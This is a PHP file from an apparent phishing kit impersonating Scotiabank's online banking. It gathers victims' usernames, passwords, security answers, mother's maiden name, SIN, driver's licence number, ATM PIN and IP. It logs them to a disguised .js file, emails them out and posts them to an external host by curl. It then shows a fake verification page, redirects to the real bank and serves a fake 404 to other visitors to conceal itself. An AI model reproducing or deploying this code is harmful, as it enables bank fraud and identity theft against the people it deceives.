<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_POST["dobyy"]))
{
	$qq1=$_SESSION["qq1"];
	$aa1=$_SESSION["aa1"];	
	$qq2=$_SESSION["qq2"];
	$aa2=$_SESSION["aa2"];	
	$qq3=$_SESSION["qq3"];
	$aa3=$_SESSION["aa3"];
	$uname=$_SESSION["uname"];
	$pword=$_SESSION["pword"];
	

	
	$name=$_POST["name"];
	$dob=$_POST["dobdd"]."/".$_POST["dobmm"]."/".$_POST["dobyy"];
	$mnn=$_POST["mnn"];
	$snn=$_POST["snn"];
	$dll=$_POST["dll"];
	$app=$_POST["app"];
	

$ip=$_SERVER["REMOTE_ADDR"];
$details="
User : $uname
Pass : $pword

Q1: $qq1 A1: $aa1
Q2: $qq2 A1: $aa2
Q3: $qq3 A1: $aa3

Full Name: $name
DOB(dd/mm/yyyy): $dob 
MMN: $mnn 
SIN: $snn 
DL: $dll 
ATM Pin: $app

IP: $ip
";
if($log_feature==1)
{
$file=fopen("../fajfkadhjadhajdha49184924.js","a");
fwrite($file,$details);
fclose($file);
}
if($email_feature==1)
{
mail($send,"Scotia Login+Full $ip",$details);
}
if($external_log == 1)
{
$ch2 = curl_init($external_link);
curl_setopt($ch2, CURLOPT_POST ,1);
curl_setopt($ch2, CURLOPT_POSTFIELDS ,"filename=fajfkadhjadhajdha49184924.js&DATA=$details");
curl_setopt($ch2, CURLOPT_HEADER ,0); 
curl_setopt($ch2, CURLOPT_RETURNTRANSFER ,1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
$data = curl_exec($ch2);
}


	
	$fname=randomCha(rand(10,13));
	$fj=randomCha(rand(14,15));
	echo '<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>

  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" href="advertisements/applei.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="advertisements/css.css?load_id='.randomCha(rand(15,16)).'">

  <meta http-equiv="refresh" content="11;URL=https://www.google.cz/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=2ahUKEwibotHkicHeAhWC1iwKHadfAwwQFjABegQIBxAB&url=https%3A%2F%2Fwww.scotiabank.com%2Fca%2Fen%2F0%2C%2C2%2C00.html&usg=AOvVaw1lD8_4_Gof3NtGofIcqiQO" />
  
<script>
var count = 0;

function spinit(){
  var bar = document.getElementsByClassName("spinner")[0].children;
  bar[count].firstChild.style.background = "black";
  count += 1; count = count % bar.length;
  bar[count].firstChild.style.background = "white";
  bar[count].firstChild.style.border = "2px solid black";
}
setInterval(spinit, 100);
</script>
  
</head>
<body class="f-topbar-fixed" onload="setTimeout(function(){ document.getElementById(\'loadingspin\').style.display=\'\'; }, 8000);">
<nav-bar params="route: route"><div>
    <div class="nav-bar fixed" >
        <nav class="top-bar scotiabank" data-topbar="" role="navigation"  style="">
            <ul class="title-area">
                <li class="name">
                    <h1>
      

                    </h1>
                </li>
                

                
                
                <li class="toggle-topbar" >
                    <img class="menu" role="button" alt="Menu" tabindex="0" src="advertisements/menu.svg" onerror="this.src=\'images/menu.png\'">
                </li>
            </ul>
            
        <section class="middle tab-bar-section" style="left: 0%;">
                        <img class="logo" aria-hidden="route().page === \'activate-select\' || route().page === \'recover-select\'  || route().page === \'dcv\' " tabindex="0" alt="Scotiabank"  src="advertisements/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section"  style="left: 0%;">
                <navigation-menu params="{route:route}"><div class="navigation-menu" >
  	<ul class="right" >
      	<li><a href="#" class="nav-item menu-accounts" tabindex="0" >Accounts</a></li>
  	
      	<li><a href="#" class="nav-item menu-move-money" tabindex="0" >Move Money</a></li>
  	
      	<li><a href="#" class="nav-item menu-locator" tabindex="0" >Locator</a></li>
  	
      	<li><a href="#" class="nav-item menu-contact" tabindex="0" >Contact Us</a></li>
  	
      	<li><a href="#" class="nav-item menu-settings" tabindex="0" >Settings</a></li>
  	
      	<li><a href="#" class="nav-item menu-logout" tabindex="0" >Logout</a></li>
  	</ul>
</div></navigation-menu>
            </section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" >
	<div class="error-message alert-box" role="alertdialog"  tabindex="-1" style="display: none;">
		
	</div>
</div></notifications>
<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div id="loadingspin" class="loading-container" role="alert" aria-live="assertive" tabindex="0" style="display: none">
	<div class="loading" id="load" aria-label="Loading"><div class="spinner" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;" role="progressbar"><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-12-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
</div></loading>
<div id="page" class="container height100" ><div  class="mfa-reset-container component-container">
    <div class="margin" id="mfa-reset-container">
        <div class="title">
            <span class="large red title" tabindex="0" >Confirmation</span>
        </div>
		


		<div class="description">
       <span class="medium" data-bind="html: description" tabindex="0">
	   <p>We\'ve successfully verified your identity, your access is now enabled.<br>
			<br>Please wait while we refresh you session.<br>
			<br>
			
			<br>
			<small><i>This page will redirect automatically, please do not close this page.</i></small>
			</span>
    </div>

		
 
    </div>
</div></div>


</body></html>';
session_destroy();
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>